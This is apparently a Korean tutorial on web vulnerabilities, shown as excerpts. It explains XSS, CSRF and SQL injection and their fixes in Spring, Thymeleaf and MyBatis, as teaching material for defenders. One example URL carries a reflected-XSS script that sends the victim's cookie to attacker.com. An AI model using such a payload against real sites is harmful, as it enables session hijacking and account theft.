...
> XSS·CSRF·SQL Injection이 각각 무엇을 착각한 결과인지 코드 수준에서 짚고, 취약한 코드를 안전한 코드로 고치는 근거를 설명할 수 있게 됩니다.
...
앞의 셋은 **파서에게 "여기부터는 값이다"라고 알려주면** 사라집니다. CSRF만 성격이 다른데,
"요청이 정상적으로 만들어졌는가"가 아니라 **"누가 이 요청을 시켰는가"**를 서버가 모르는 문제입니다.
...
스크립트가 실행됩니다. 저장형과 달리 DB에 흔적이 남지 않아 공격받은 사실 자체를 모르고 지나가기 쉽습니다.
`https://shop.example.com/search?q=<script>location='https://attacker.com/?c='%2Bdocument.cookie</script>`

개선은 두 갈래입니다. 서버 렌더링이면 값을 model에 담고 `th:text`로 출력해 템플릿 엔진의 자동 이스케이프에
맡깁니다. HTML을 문자열로 조립해야만 한다면 인코딩을 명시한다 —
...
`innerHTML`이 그 문자열을 HTML로 파싱합니다. `<script>` 태그는 `innerHTML`로 넣어도 실행되지 않지만
`onerror`·`onload` 같은 이벤트 핸들러 속성은 그대로 동작합니다. **"script 태그만 막으면 된다"는
블랙리스트 발상이 무너지는 지점**입니다.
...
`onerror=`)가 기본 차단되므로 위에서 본 `onerror` 공격이 실행 단계에서 막힙니다. 반면 `'unsafe-inline'`을
...
스크립트는 여전히 실행되고 쿠키를 훔치는 대신 그 사용자로서 요청을 보내면 그만입니다.
...
"사용자가 우리 화면에서 의도적으로 눌렀는가"는 다른 질문인데, 그것은 확인하지 않습니다.

Spring Security는 CSRF 필터가 기본 활성화되어, 세션에 저장한 토큰과 요청의 `_csrf` 값을 비교하고
다르면 403으로 거부합니다. Thymeleaf는 `th:action`을 쓰면 hidden 토큰을 자동 삽입하고
SPA에서는 `X-CSRF-TOKEN` 헤더로 실어 보냅니다. 공격자가 이 토큰을 알아내려면 우리 페이지의 응답을
읽어야 하는데 SOP가 그것을 막습니다. **SOP가 있어야 CSRF 토큰이 의미를 갖습니다.**
...
MyBatis에서는 `${}`가 문자열 치환, `#{}`가 파라미터 바인딩이므로 **`${}`는 인젝션에 그대로 노출됩니다.**
...
**A01이 1위라는 점**이 시사적입니다. 프레임워크가 인젝션은 상당 부분 막아주지만 "이 사용자가 이
리소스를 볼 수 있는가"는 대신 판단해줄 수 없습니다. 목록은 몇 년 주기로 갱신되니 최신판도 확인해둡니다.
...
XSS와 SQL Injection은 **데이터를 코드로 해석하게 둔 실수**이므로 파서에게 경계를 알려주는 것(인코딩, 파라미터 바인딩)으로 풀고, CSRF는 **요청의 출처를 묻지 않은 실수**이므로 자동 첨부·출처 미검증·재현 가능성 중 하나를 깨서 풉니다.
